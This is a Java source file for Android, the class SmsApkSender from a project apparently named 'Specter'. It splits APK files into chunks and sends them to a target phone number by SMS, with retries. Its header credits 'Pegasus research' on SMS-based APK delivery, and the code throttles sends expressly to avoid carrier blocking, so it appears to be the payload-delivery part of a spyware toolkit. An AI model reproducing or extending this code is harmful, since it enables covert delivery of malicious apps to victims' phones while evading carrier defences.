package com.divine.specter.child.delivery;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.telephony.SmsManager;
import android.util.Log;

import java.io.File;
import java.util.List;

/**
 * SMS APK Sender - Sends APK files via chunked SMS messages
 *
 * Based on Pegasus research showing SMS-based APK delivery.
 *
 * Features:
 * - Sends APK in 120-byte chunks
 * - Throttles sends to avoid carrier blocking
 * - Tracks delivery status
 * - Auto-retry failed chunks
 * - Progress callbacks
 *
 * @author Specter Development Team
 * @version 1.0
 */
public class SmsApkSender {
    private static final String TAG = "SmsApkSender";

    // Sending configuration
    private static final long THROTTLE_DELAY_MS = 2000;  // 2 seconds between SMS
    private static final int MAX_RETRIES = 3;

    // Intent actions for tracking
    private static final String ACTION_SENT = "com.specter.SMS_SENT";
    private static final String ACTION_DELIVERED = "com.specter.SMS_DELIVERED";

    private Context context;
    private SmsManager smsManager;
    private SendProgressListener progressListener;

    // Sending state
    private volatile boolean isSending = false;
    private volatile boolean shouldCancel = false;
    private int totalChunks = 0;
    private int sentChunks = 0;
    private int failedChunks = 0;

    /**
     * Progress listener interface
     */
    public interface SendProgressListener {
        void onProgress(int sent, int total, float percentage);
        void onChunkSent(int chunkNum, boolean success);
        void onComplete(boolean success, int totalSent, int failed);
        void onError(String error);
    }

    public SmsApkSender(Context context) {
        this.context = context.getApplicationContext();
        this.smsManager = SmsManager.getDefault();
    }

    /**
     * Set progress listener
     */
    public void setProgressListener(SendProgressListener listener) {
        this.progressListener = listener;
    }

    /**
     * Send APK file via SMS
     *
     * @param apkFile APK file to send
     * @param phoneNumber Recipient phone number
     */
    public void sendApk(File apkFile, String phoneNumber) {
        if (isSending) {
            Log.w(TAG, "Already sending APK");
            if (progressListener != null) {
                progressListener.onError("Already sending an APK");
            }
            return;
        }

        Log.i(TAG, "Starting APK send: " + apkFile.getName() + " to " + phoneNumber);

        // Send in background thread
        new Thread(() -> {
            try {
                sendApkInternal(apkFile, phoneNumber);
            } catch (Exception e) {
                Log.e(TAG, "Failed to send APK", e);
                if (progressListener != null) {
                    progressListener.onError("Send failed: " + e.getMessage());
                }
            } finally {
                isSending = false;
                shouldCancel = false;
            }
        }).start();
    }

    /**
     * Internal send implementation
     */
    private void sendApkInternal(File apkFile, String phoneNumber) throws Exception {
        isSending = true;
        shouldCancel = false;
        sentChunks = 0;
        failedChunks = 0;

        // Chunk the APK
        Log.i(TAG, "Chunking APK...");
        List<SmsChunker.ChunkInfo> chunks = SmsChunker.chunkApk(apkFile);
        totalChunks = chunks.size();

        Log.i(TAG, "Sending " + totalChunks + " chunks to " + phoneNumber);

        // Register delivery receivers
        IntentFilter sentFilter = new IntentFilter(ACTION_SENT);
        IntentFilter deliveredFilter = new IntentFilter(ACTION_DELIVERED);

        BroadcastReceiver sentReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                int chunkNum = intent.getIntExtra("chunk_num", -1);
                boolean success = getResultCode() == android.app.Activity.RESULT_OK;

                if (success) {
                    Log.d(TAG, "Chunk " + chunkNum + " sent successfully");
                } else {
                    Log.w(TAG, "Chunk " + chunkNum + " send failed: " + getResultCode());
                    failedChunks++;
                }

                if (progressListener != null) {
                    progressListener.onChunkSent(chunkNum, success);
                }
            }
        };

        context.registerReceiver(sentReceiver, sentFilter);

        try {
            // Send each chunk
            for (int i = 0; i < chunks.size(); i++) {
                if (shouldCancel) {
                    Log.i(TAG, "Send cancelled by user");
                    break;
                }

                SmsChunker.ChunkInfo chunk = chunks.get(i);
                int chunkNum = i + 1;

                // Send with retry
                boolean sent = false;
                for (int retry = 0; retry < MAX_RETRIES && !sent; retry++) {
                    if (retry > 0) {
                        Log.d(TAG, "Retry " + retry + " for chunk " + chunkNum);
                        Thread.sleep(1000);  // Wait before retry
                    }

                    sent = sendChunk(chunk, phoneNumber, chunkNum);
                }

                if (sent) {
                    sentChunks++;

                    // Update progress
                    float progress = (sentChunks * 100.0f) / totalChunks;
                    if (progressListener != null) {
                        progressListener.onProgress(sentChunks, totalChunks, progress);
                    }

                    Log.d(TAG, String.format("Progress: %d/%d (%.1f%%)",
                        sentChunks, totalChunks, progress));
                } else {
                    failedChunks++;
                    Log.e(TAG, "Failed to send chunk " + chunkNum + " after " + MAX_RETRIES + " retries");
                }

                // Throttle to avoid carrier blocking
                if (i < chunks.size() - 1) {
                    Thread.sleep(THROTTLE_DELAY_MS);
                }
            }

            // Complete
            boolean success = (failedChunks == 0 && !shouldCancel);
            Log.i(TAG, String.format("Send complete: %d sent, %d failed",
                sentChunks, failedChunks));

            if (progressListener != null) {
                progressListener.onComplete(success, sentChunks, failedChunks);
            }

        } finally {
            context.unregisterReceiver(sentReceiver);
        }
    }

    /**
     * Send single chunk
     *
     * @param chunk Chunk to send
     * @param phoneNumber Recipient
     * @param chunkNum Chunk number (for tracking)
     * @return true if sent successfully
     */
    private boolean sendChunk(SmsChunker.ChunkInfo chunk, String phoneNumber, int chunkNum) {
        try {
            String message = chunk.rawMessage;

            // Create sent intent
            Intent sentIntent = new Intent(ACTION_SENT);
            sentIntent.putExtra("chunk_num", chunkNum);
            PendingIntent sentPI = PendingIntent.getBroadcast(
                context, chunkNum, sentIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
            );

            // Send SMS
            smsManager.sendTextMessage(
                phoneNumber,
                null,           // Service center (null = default)
                message,
                sentPI,         // Sent status
                null            // Delivery status (optional)
            );

            Log.d(TAG, "Sent chunk " + chunkNum + ": " + message.length() + " chars");
            return true;

        } catch (Exception e) {
            Log.e(TAG, "Failed to send chunk " + chunkNum, e);
            return false;
        }
    }

    /**
     * Cancel ongoing send operation
     */
    public void cancel() {
        if (isSending) {
            Log.i(TAG, "Cancelling send operation");
            shouldCancel = true;
        }
    }

    /**
     * Check if currently sending
     */
    public boolean isSending() {
        return isSending;
    }

    /**
     * Get sending progress
     */
    public float getProgress() {
        if (totalChunks == 0) return 0;
        return (sentChunks * 100.0f) / totalChunks;
    }

    /**
     * Get statistics
     */
    public String getStats() {
        return String.format("Sent: %d/%d, Failed: %d, Progress: %.1f%%",
            sentChunks, totalChunks, failedChunks, getProgress());
    }
}
